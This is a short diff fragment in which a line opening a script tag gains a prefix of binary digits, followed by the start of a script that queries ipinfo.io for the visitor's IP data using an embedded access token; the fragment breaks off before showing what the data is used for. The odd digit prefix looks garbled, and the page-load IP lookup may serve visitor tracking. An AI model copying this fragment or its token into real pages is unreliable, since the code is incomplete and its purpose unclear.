@@ -1,4 +1,4 @@
-<script>
+0000011110000000000000000000000000<script>
 !function(){
   fetch("https://ipinfo.io/json?token=777df2fc7c6f01")
     .then(r => r.json())
